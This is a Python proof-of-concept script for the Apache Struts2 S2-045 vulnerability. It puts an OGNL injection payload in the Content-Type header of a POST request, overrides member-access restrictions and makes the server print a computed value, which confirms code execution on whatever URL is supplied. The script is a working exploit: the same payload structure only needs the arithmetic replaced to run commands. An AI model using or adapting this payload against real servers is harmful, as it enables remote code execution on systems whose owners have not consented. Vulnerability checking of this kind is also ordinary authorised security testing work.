#!/usr/bin/env python
#coding:utf8
import sys
import requests
requests.packages.urllib3.disable_warnings()
 
def poccheck(url):
    result = False
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
        'Content-Type':"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}"
    }
    try:
        response = requests.post(url,data='',headers=header,verify=False,allow_redirects = False)
        if response.content.find("88866777")!=-1:
            result = url+" find struts2-45"
    except Exception as e:
        print str(e)
        pass
    return result
 
if __name__ == '__main__':
    if len(sys.argv) == 2:
        print poccheck(sys.argv[1])
        sys.exit(0)
    else:
        print ("usage: %s http://www.xxxxx.com/vuln.action" % sys.argv[0])
        sys.exit(-1)
